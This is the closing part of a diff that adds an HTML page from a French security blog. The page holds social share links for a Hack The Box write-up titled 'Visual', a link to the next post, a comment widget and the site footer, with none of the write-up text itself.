+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f02%2fhtb-visual%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg role="img" width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+    <title>X</title>
+    <path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z" stroke="#ffffff"/>
+</svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HTB%3a%20Visual&amp;caption=HTB%3a%20Visual&amp;canonicalUrl=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f02%2fhtb-visual%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=HTB%3a%20Visual&amp;body=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f02%2fhtb-visual%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f02%2fhtb-visual%2f&amp;media=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f02%2fhtb-visual%2f;description=HTB%3a%20Visual" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f02%2fhtb-visual%2f&amp;title=HTB%3a%20Visual&amp;summary=HTB%3a%20Visual&amp;source=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f02%2fhtb-visual%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f02%2fhtb-visual%2f&amp;resubmit=true&amp;title=HTB%3a%20Visual" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f02%2fhtb-visual%2f;title=HTB%3a%20Visual" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%3a%20Visual%20https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f02%2fhtb-visual%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f02%2fhtb-visual%2f&amp;t=HTB%3a%20Visual" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%3a%20Visual&amp;url=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f02%2fhtb-visual%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://scorpiosec.com/fr/posts/2024/02/thm-ohsint/">
+                    <span class="button__text">THM: OhSINT</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+    <script src="https://utteranc.es/client.js"
+            repo="K-Scorpio/scorpiosec"
+            label="comment"
+            issue-term="pathname"
+            theme="github-dark"
+            crossorigin="anonymous"
+            async>
+    </script>
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            
+            
+            
+            <span>K-Scorpio</span>
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Theme - <a href="https://themes.gohugo.io/themes/hugo-theme-hello-friend-ng/">Hello Friend NG</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://scorpiosec.com/bundle.min.ac2a4bcaed631ec2dc154407be7f09fc28da37de71fae6dee6711b2a3d1622770f87d3cda22c460e9a68ff619bdb1dd75cb7a5d33f159a54e419736cc4541087.js" integrity="sha512-rCpLyu1jHsLcFUQHvn8J/CjaN95x&#43;ube5nEbKj0WIncPh9PNoixGDppo/2Gb2x3XXLel0z8VmlTkGXNsxFQQhw=="></script>
+
+
+
+
+    </body>
+</html>
